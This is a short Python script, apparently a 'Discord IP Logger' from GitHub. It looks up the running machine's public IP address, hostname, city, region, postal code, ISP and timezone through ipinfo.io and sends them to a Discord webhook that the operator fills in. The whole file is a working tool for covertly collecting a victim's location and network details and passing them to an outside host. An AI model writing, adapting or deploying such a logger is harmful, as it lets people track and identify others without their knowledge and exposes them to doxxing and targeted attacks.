'''https://github.com/dontlookthere/Discord-IP-Logger/'''



import json
from urllib.request import urlopen
from dhooks import Webhook

x = urlopen('https://ipinfo.io/json')

info = json.loads(x.read())

a = info['ip'] 
b = info['hostname']
c = info['country']
d = info['city']
e = info['region']
f = info['postal']
g = info['org']
h = info['timezone']

flag = 'https://www.countryflags.io/%s/shiny/64.png' % c 

z = a + '\n' + b + '\n' + c + '\n' + d + '\n' + e + '\n' + f + '\n' + g + '\n' + h

hook = Webhook('YOUR_WEBHOOK_HERE', username='ANY_NAME_YOU_WANT', avatar_url=flag)

hook.send(str(z))
